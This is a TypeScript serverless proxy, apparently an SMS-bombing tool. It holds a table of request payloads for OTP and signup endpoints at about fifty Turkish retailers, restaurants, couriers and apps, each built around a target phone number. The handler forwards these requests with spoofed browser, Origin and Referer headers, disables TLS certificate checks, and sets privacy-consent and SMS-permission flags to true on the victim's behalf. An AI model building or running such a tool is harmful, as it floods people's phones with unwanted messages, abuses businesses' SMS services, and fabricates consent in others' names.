// @ts-nocheck
import type { VercelRequest, VercelResponse } from '@vercel/node';

// 1. SSL/TLS KONTROLLERİNİ KAPAT (Legacy Sistemler İçin Şart)
process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';

// --- TİP TANIMLARI ---
type ProxyRequestBody = {
  serviceId?: string;
  serviceUrl?: string;
  serviceMethod?: string;
  serviceHeaders?: Record<string, unknown>;
  targetPhone?: string;
  email?: string;
  body?: unknown;
};

// --- YARDIMCI: Telefon Formatlayıcı ---
const formatPhone = (phone: string, type: 'raw' | '90' | '05'): string => {
  const p = (phone || '').replace(/\D/g, ''); 
  if (type === '90') return p.startsWith('90') ? p : `90${p}`;
  if (type === '05') return p.startsWith('90') ? `0${p.substring(2)}` : (p.startsWith('0') ? p : `0${p}`);
  return p.startsWith('90') ? p.substring(2) : p; // raw (5XX...)
};

// --- YARDIMCI: Akıllı Payload Üretici ---
const buildSmartPayload = (body: ProxyRequestBody): string => {
  if (body.body) return typeof body.body === 'string' ? body.body : JSON.stringify(body.body);

  const phoneRaw = formatPhone(body.targetPhone || '', 'raw'); 
  const phone90 = formatPhone(body.targetPhone || '', '90');   
  const phone05 = formatPhone(body.targetPhone || '', '05');   
  const email = body.email || 'iletisim@example.com'; 

  const serviceId = (body.serviceId || '').toLowerCase();

  const payloadMap: Record<string, any> = {
    // Giyim
    'lc_waikiki': { PhoneNumber: phoneRaw },
    'defacto': { MobilePhone: phoneRaw },
    'koton': { email: email, mobile: phoneRaw, sms_permission: true, kvkk_permission: true },
    'mavi': { phone: phoneRaw, permission: true, kvkk: true },
    'boyner': { gsm: phoneRaw },
    'penti': { phone: phoneRaw },
    'flo': { mobile: phoneRaw, sms_permission: 1 },
    'in_street': { mobile: phoneRaw },
    'korayspor': { phone: phoneRaw },

    // Market
    'migros_money': { gsm: phoneRaw, moneyCard: "", isKvkkConfirmed: true },
    'file_market': { mobilePhoneNumber: phone90 },
    'bim_market': { msisdn: phone90 },
    'english_home': { Phone: phone05, Source: "WEB" },
    'evidea': { phone: phoneRaw, sms_allowed: "on" },
    'wmf': { phone: phoneRaw, confirm: "true" },
    'hayat_su': { mobilePhoneNumber: phone05 },
    'metro_market': { methodType: "2", mobilePhoneNumber: phoneRaw },

    // Yemek
    'tikla_gelsin': { 
        operationName: "GENERATE_OTP", 
        variables: { phone: phoneRaw, countryCode: "TR" }, 
        query: "mutation GENERATE_OTP($phone: String!, $countryCode: String) { generateOtp(phone: $phone, countryCode: $countryCode) { isSuccess message } }" 
    },
    'kahve_dunyasi': { countryCode: "90", phoneNumber: phoneRaw },
    'starbucks': { mobile: phoneRaw },
    'burger_king': { phone: phoneRaw },
    'popeyes': { phone: phoneRaw },
    'arbys': { phone: phoneRaw },
    'usta_donerci': { phone: phoneRaw },
    'dominos': { isSure: false, mobilePhone: phoneRaw },
    'little_caesars': { Phone: phone05, NameSurname: "Misafir" },
    'pasaport_pizza': { phone: phoneRaw },
    'baydoner': { Name: "Misafir", Surname: "Kullanici", Gsm: phoneRaw },
    'kofteci_yusuf': { FirmaId: 82, Telefon: phoneRaw },
    'komagene': { FirmaId: 32, Telefon: phoneRaw },
    'coffy': { phoneNumber: phoneRaw, countryCode: "90", isKVKKAgreementApproved: true },

    // Ulaşım & Kargo
    'marti': { mobile_number: phoneRaw },
    'binbin': { phone: phoneRaw },
    'yurtici_kargo': { phone: phoneRaw },
    'aras_kargo': { msisdn: phone90 },
    'mng_kargo': { tel: phoneRaw },
    'surat_kargo': { phone: phoneRaw },
    'ido': { phone: phoneRaw },
    'kamil_koc': { Phone: phoneRaw },
    'pamukkale': { mobile: phoneRaw },
    'metro_turizm': { phone: phoneRaw },

    // Diğer
    'yapp': { phone_number: phoneRaw },
    'suiste': { gsm: phoneRaw, action: "register" },
    'porty': { phone: phoneRaw },
    'kim_gb_ister': { msisdn: phone90 },
    '345_dijital': { phoneNumber: "+" + phone90 },
    'beefull': { phone: phoneRaw },
    'naosstars': { telephone: "+" + phone90, type: "register" },
    'akasya_avm': { phone: phoneRaw },
    'dr_store': { mobile: phoneRaw },
    'kitapyurdu': { mobile: phoneRaw },
    'bkm_kitap': { phone: phoneRaw },
    'cineverse': { mobile: phoneRaw },

    'default': { phone: phoneRaw, email: email, mobile: phoneRaw }
  };

  const payload = payloadMap[serviceId] || payloadMap['default'];
  return JSON.stringify(payload);
};

export default async function handler(req: VercelRequest, res: VercelResponse) {
  // CORS
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', '*');

  if (req.method === 'OPTIONS') return res.status(200).end();

  try {
    let body: ProxyRequestBody = {};
    if (typeof req.body === 'string') {
        try { body = JSON.parse(req.body); } catch { body = {}; }
    } else {
        body = req.body || {};
    }

    if (!body.serviceUrl) return res.status(400).json({ reachable: false, ok: false, error: 'Missing serviceUrl' });

    // URL Düzeltme (https ekle)
    let targetUrlStr = body.serviceUrl.trim();
    if (!/^https?:\/\//i.test(targetUrlStr)) {
        targetUrlStr = 'https://' + targetUrlStr;
    }
    const targetUrl = new URL(targetUrlStr);

    const headers = {
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
      'Accept': 'application/json, text/plain, */*',
      'Content-Type': 'application/json',
      'Origin': targetUrl.origin,
      'Referer': targetUrl.origin + '/'
    };

    const requestPayload = buildSmartPayload(body);
    const serviceMethod = (body.serviceMethod || 'POST').toUpperCase();

    // TIMEOUT KONTROLÜ (15 Saniye)
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 15000);

    try {
        const response = await fetch(targetUrl.toString(), {
            method: serviceMethod,
            headers: headers,
            body: serviceMethod === 'GET' ? undefined : requestPayload,
            redirect: 'follow',
            signal: controller.signal
        });
        clearTimeout(timeout);

        const responseText = await response.text();
        
        // SİMÜLATÖRÜN ANLADIĞI DİLDE YANIT DÖN
        // Burası kritik: Upstream 400 verse bile biz 200 dönüyoruz ama içine "ok: false" koyuyoruz.
        // Böylece Simülatör "Proxy failed" demiyor, "Request reached upstream (400)" diyor.
        return res.status(200).json({
            reachable: true,
            ok: response.ok, // 200-299 ise true
            status: 200,     // Proxy'nin kendi statüsü hep 200
            upstreamStatus: response.status, // Karşı tarafın statüsü (400, 200, 503)
            serviceId: body.serviceId,
            responsePreview: responseText.substring(0, 500),
            error: response.ok ? null : `Upstream: ${response.status}`
        });

    } catch (fetchError: any) {
        clearTimeout(timeout);
        return res.status(200).json({
            reachable: false,
            ok: false,
            status: 500,
            upstreamStatus: 0,
            error: fetchError.name === 'AbortError' ? 'Timeout' : fetchError.message
        });
    }

  } catch (error: any) {
    return res.status(500).json({ error: 'Internal Proxy Error', details: error.message });
  }
}